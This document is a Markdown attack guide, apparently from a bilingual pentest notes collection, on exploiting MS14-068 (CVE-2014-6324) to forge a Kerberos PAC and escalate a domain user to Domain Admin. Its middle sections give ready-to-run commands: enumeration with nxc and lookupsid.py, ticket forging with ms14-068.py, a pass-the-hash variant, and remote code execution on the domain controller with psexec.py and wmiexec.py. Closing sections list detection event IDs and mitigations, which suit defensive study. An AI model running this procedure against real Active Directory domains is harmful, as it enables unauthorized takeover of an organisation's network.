# MS14-068: from user to Domain Admin with a forged PAC

**English** | [🇪🇸 Español](ms14-068.md)

## 1. The flaw

Kerberos in Active Directory attaches a **PAC** (Privilege Attribute Certificate) to the TGT. The PAC lists the user's groups and is signed by the KDC. On controllers missing **KB3011780**, the KDC does not correctly validate the signature when the client presents a manipulated TGT: a normal user can build a PAC containing `Domain Admins` and request a valid TGT.

- CVE: **CVE-2014-6324**
- Affects: Windows Server 2003/2008/2008 R2/2012/2012 R2 without the November 2014 patch.
- Requirements: a valid domain account (user and password/hash), the user SID, the domain and a reachable DC.

It needs no prior privileges and no misconfigured domain. It is a flaw in the KDC itself.

## 2. Required data

```bash
nxc smb <DC_IP> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN>
nxc ldap <DC_IP> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> --users
```

You need:

- `DOMAIN` as `CORP.LOCAL`.
- `USER` and `PASSWORD` (or the NT hash for `-hashes`).
- `USER_SID`: from `lookupsid.py`, `nxc --users` or BloodHound.
- `DC_IP` and the DC hostname.

```bash
lookupsid.py '<DOMAIN>/<USER>:<PASSWORD>@<DC_IP>' | grep '<USER>'
```

## 3. Forge and use

```bash
python3 ms14-068.py -u '<USER>@<DOMAIN>' -p '<PASSWORD>' \
  -s '<USER_SID>' -d <DC_IP>
export KRB5CCNAME=./<USER>.ccache
klist
```

The script requests a TGT with the manipulated PAC and saves the `.ccache`. With the ticket:

```bash
psexec.py -k -no-pass '<DOMAIN>/<USER>@<DC_HOST>'
wmiexec.py -k -no-pass '<DOMAIN>/<USER>@<DC_HOST>'
nxc smb <DC_IP> -k --shares
```

If clocks drift, you get `KRB_AP_ERR_SKEW`. Fix the time or use `faketime`; the ticket has a limited lifetime.

## 4. Variants

- **No cleartext password**: some `ms14-068.py` versions accept `-a <NT_HASH>`; otherwise use `getTGT.py` with `-hashes` and then forge the PAC.
- **Existing session**: request a normal TGT, extract the SID and re-forge the PAC.
- **LDAP only**: if 445 is closed, the ticket still works for LDAP enumeration, but code execution needs SMB/WMI/WinRM.

## 5. Detection

- **4768** (TGT requested) with a PAC containing groups the user does not hold.
- **4769** afterwards from the same source.
- **4624** type 3 on the DC from an unusual workstation.
- **7045** if a service is created for execution.
- The `.ccache` on disk and `psexec`/`wmiexec` with `-k -no-pass`.

There is no single “forged PAC” event; correlation is what exposes it.

## 6. Mitigation

- Apply **KB3011780** to every DC and verify patch level.
- Audit weak or reused passwords: they are the entry point.
- Restrict SMB/WMI/WinRM access from user workstations.
- Monitor 4768 with anomalous groups and ticket use from unmanaged hosts.
- Rotate credentials after an incident and review created accounts.

MITRE: T1558, T1078, T1021.002.
